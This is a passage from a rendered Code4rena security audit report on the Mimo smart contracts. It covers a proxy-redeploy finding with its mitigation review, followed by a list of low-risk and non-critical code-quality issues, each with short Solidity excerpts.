class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;function returned an unexpected amount of data&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/162#issuecomment-1210522543\">RayXpub (Mimo) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>We confirm this issue and intend to implement a fix. </p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> A warden identified that if a <code>MIMOProxy</code> owner destroys their proxy by calling selfdestruct, they cannot deploy another from the same address.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team added <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/contracts/proxy/MIMOProxyFactory.sol#L50\">a check</a> for the current proxy’s codesize in <code>MIMOProxyFactory#deploy</code>. If the proxy has been destroyed it is will be deleted from the <code>_proxyStates</code> mapping and a new proxy can be deployed. A <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/5a63c76ed74186d11d3adb361d3b3aacefa7795e/test/01_unit/proxy/MIMOProxyFactory.test.ts#L230\">unit test</a> demonstrates this behavior.</p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since a proxy’s codesize will be zero when it has been destroyed, and cannot be zero otherwise, this check will allow the owner of a destroyed proxy to deploy another.</p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 50 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/118\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/98\">Dravee</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/51\">mics</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/126\">0xDjango</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/41\">JohnSmith</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/104\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/133\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/30\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/59\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/61\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/164\">horsefacts</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/165\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/167\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/49\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/113\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/6\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/11\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/21\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/53\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/58\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/64\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/87\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/92\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/109\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/132\">Sm4rty</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/33\">bulej93</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/83\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/90\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/114\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/122\">natzuu</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/136\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/137\">Rohan16</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/139\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/171\">JC</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/3\">samruna</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/8\">TomFrenchBlockchain</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/15\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/38\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/47\">tofunmi</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/70\">nxrblsrpr</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/72\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/76\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/96\">_141345_</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/97\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/112\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/128\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/135\">SooYa</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/140\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/148\">wagmi</a>, and <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/168\">aysha</a>.</em></p>\n<h2 id=\"low-risk-issues\" style=\"position:relative;\"><a href=\"#low-risk-issues\" aria-label=\"low risk issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk Issues</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>L‑01</td>\n<td align=\"left\">Use of <code>msg.value</code> in functions available to batches</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>L‑02</td>\n<td align=\"left\">Unused/empty <code>receive()</code>/<code>fallback()</code> function</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>L‑03</td>\n<td align=\"left\">Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</td>\n<td align=\"center\">2</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 4 instances over 3 issues</p>\n<h2 id=\"l01--use-of-msgvalue-in-functions-available-to-batches\" style=\"position:relative;\"><a href=\"#l01--use-of-msgvalue-in-functions-available-to-batches\" aria-label=\"l01  use of msgvalue in functions available to batches permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑01]  Use of <code>msg.value</code> in functions available to batches</h2>\n<p>The contract extends <code>BoringBatchable</code>, which warns to ensure <code>msg.value</code> isn’t able to be used in a batchable call. <code>MIMOVaultActions.depositETH()</code> and <code>MIMOVaultActions.depositETHAndBorrow()</code> both use <code>msg.value</code> but aren’t currently exploitable due to the fact that it has to be executed by the owner or an envoy, needs to be allow-listed, and even then the functions would require latent funds.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">response</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L54\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L54</a></p>\n<h2 id=\"l02--unusedempty-receivefallback-function\" style=\"position:relative;\"><a href=\"#l02--unusedempty-receivefallback-function\" aria-label=\"l02  unusedempty receivefallback function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑02]  Unused/empty <code>receive()</code>/<code>fallback()</code> function</h2>\n<p>If the intention is for the Ether to be used, the function should call another function, otherwise it should revert (e.g. <code>require(msg.sender == address(weth))</code>)</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">:     </span><span class=\"mtk11\">receive</span><span class=\"mtk1\">() </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payable</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L38\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L38</a></p>\n<h2 id=\"l03--missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" style=\"position:relative;\"><a href=\"#l03--missing-checks-for-address0x0-when-assigning-values-to-address-state-variables\" aria-label=\"l03  missing checks for address0x0 when assigning values to address state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L‑03]  Missing checks for <code>address(0x0)</code> when assigning values to <code>address</code> state variables</h2>\n<p><em>There are 2 instances of this issue. (For in-depth details on this and all further low and non-critical items with multiple instances, see the warden’s <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/118\">full report</a>.)</em></p>\n<h2 id=\"non-critical-issues\" style=\"position:relative;\"><a href=\"#non-critical-issues\" aria-label=\"non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical Issues</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>N‑01</td>\n<td align=\"left\">Missing <code>initializer</code> modifier on constructor</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>N‑02</td>\n<td align=\"left\"><code>override</code> function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>N‑03</td>\n<td align=\"left\"><code>constant</code>s should be defined rather than using magic numbers</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td>N‑04</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">11</td>\n</tr>\n<tr>\n<td>N‑05</td>\n<td align=\"left\">Constant redefined elsewhere</td>\n<td align=\"center\">7</td>\n</tr>\n<tr>\n<td>N‑06</td>\n<td align=\"left\">Lines are too long</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td>N‑07</td>\n<td align=\"left\">Typos</td>\n<td align=\"center\">12</td>\n</tr>\n<tr>\n<td>N‑08</td>\n<td align=\"left\">File is missing NatSpec</td>\n<td align=\"center\">11</td>\n</tr>\n<tr>\n<td>N‑09</td>\n<td align=\"left\">NatSpec is incomplete</td>\n<td align=\"center\">23</td>\n</tr>\n<tr>\n<td>N‑10</td>\n<td align=\"left\">Event is missing <code>indexed</code> fields</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>N‑11</td>\n<td align=\"left\">Not using the named return variables anywhere in the function is confusing</td>\n<td align=\"center\">3</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 81 instances over 11 issues</p>\n<h2 id=\"n01--missing-initializer-modifier-on-constructor\" style=\"position:relative;\"><a href=\"#n01--missing-initializer-modifier-on-constructor\" aria-label=\"n01  missing initializer modifier on constructor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑01]  Missing <code>initializer</code> modifier on constructor</h2>\n<p>OpenZeppelin <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5\">recommends</a> that the <code>initializer</code> modifier be applied to constructors in order to avoid potential griefs, <a href=\"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/4\">social engineering</a>, or exploits. Ensure that the modifier is applied to the implementation contract. If the default constructor is currently being used, it should be changed to be an explicit one with the modifier applied.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">:   </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IMIMOProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Initializable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">BoringBatchable</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L12\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L12</a></p>\n<h2 id=\"n02--override-function-arguments-that-are-unused-should-have-the-variable-name-removed-or-commented-out-to-avoid-compiler-warnings\" style=\"position:relative;\"><a href=\"#n02--override-function-arguments-that-are-unused-should-have-the-variable-name-removed-or-commented-out-to-avoid-compiler-warnings\" aria-label=\"n02  override function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑02]  <code>override</code> function arguments that are unused should have the variable name removed or commented out to avoid compiler warnings</h2>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOFlashloan</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">41</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premiums</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">42</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initiator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">43</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/MIMOFlashloan.sol#L39\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/MIMOFlashloan.sol#L39</a></p>\n<h2 id=\"n03--constants-should-be-defined-rather-than-using-magic-numbers\" style=\"position:relative;\"><a href=\"#n03--constants-should-be-defined-rather-than-using-magic-numbers\" aria-label=\"n03  constants should be defined rather than using magic numbers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑03]  <code>constant</code>s should be defined rather than using magic numbers</h2>\n<p>Even <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/9d7ce4d08bf3c3010304a0476a785c70c0e90ae7/contracts/lib/TokenTransferrer.sol#L35-L39\">assembly</a> can benefit from using readable constants instead of hex/numeric literals</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">automated</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOAutoRebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 1e15</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">autoVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">targetRatio</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1e15</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// add 0.1% to account for rounding</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/automated/MIMOAutoRebalance.sol#L180\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/automated/MIMOAutoRebalance.sol#L180</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit 5_000</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5_000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a 